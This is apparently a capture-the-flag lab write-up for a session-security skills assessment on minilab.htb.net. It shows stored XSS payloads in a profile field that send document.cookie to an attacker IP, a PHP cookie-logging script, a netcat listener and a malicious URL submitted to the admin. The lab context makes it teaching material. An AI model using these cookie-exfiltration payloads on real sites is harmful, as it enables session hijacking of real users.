# Session Security - Skills Assessment

You are currently participating in a bug bounty program.

* The only URL in scope is `http://minilab.htb.net`
* Attacking end-users through client-side attacks is in scope for this particular bug bounty program.
* Test account credentials:
  * Email: heavycat106
  * Password: rocknrol
* Through dirbusting, you identified the following endpoint `http://minilab.htb.net/submit-solution`

Find a way to hijack an admin's session. Once you do that, answer the two questions below.

***

vHosts needed for these questions:

`minilab.htb.net`

* Read the flag residing in the admin's public profile. Answer format: \[string]

We can see into us profile, the country input, i will be put basic xss to see if it is vulnerable -->

<figure><img src="../../../.gitbook/assets/image (290).png" alt=""><figcaption></figcaption></figure>

Then, i go to "Share" options and see my public profile -->

<figure><img src="../../../.gitbook/assets/image (291).png" alt=""><figcaption></figcaption></figure>

Nice! With it i can try to CSRF, put it into "Country" -->

```
<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://10.10.15.232:1234/index.php?c=' + document.cookie;"></video>
```

And craft a web with it -->

First I created the following `index.php`:

```
<?php
$logFile = "cookieLog.txt";
$cookie = $_REQUEST["c"];
 
$handle = fopen($logFile, "a");
fwrite($handle, $cookie . "\n\n");
fclose($handle);
 
header("Location: http://minilab.htb.net/app/");
exit;
?>

```

Then I started a php server:

```
php -S 0.0.0.0:1234
```

Now, sen the url profile share to admin -->

`http://minilab.htb.net/submit-solution?url=http://10.10.15.232:1234`

<figure><img src="../../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

It found... more o less... so... try with netcat -->

```
sudo nc -nlvp 666
```

```
<h1 onmouseover='document.write(`<img src="http://10.10.15.232:666?cookie=${btoa(document.cookie)}">`)'>test</h1>
```

<figure><img src="../../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

NICE! now, send it to the admin -->

`http://minilab.htb.net/submit-solution?url=http://10.10.15.232:666`

<figure><img src="../../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

`http://minilab.htb.net/submit-solution?url=http://minilab.htb.net/profile?email=julie.rogers@example.com`

<figure><img src="../../../.gitbook/assets/image (12) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

IT MAKE! Okay, now knowing this i will to get up the php http server again -->

> I’ll use the previous php method to get the admin cookie but target to = `http://minilab.htb.net/submit-solution?url=http://minilab.htb.net/profile?email=julie.rogers@example.com`

<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (14) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (15) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

* Go through the PCAP file residing in the admin's public profile and identify the flag. Answer format: FLAG{string}

Now, into the admin profile, i can see a PCAP file, i will be to download it and see with wireshark -->

<figure><img src="../../../.gitbook/assets/image (16) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now search about "http"

<figure><img src="../../../.gitbook/assets/image (17) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
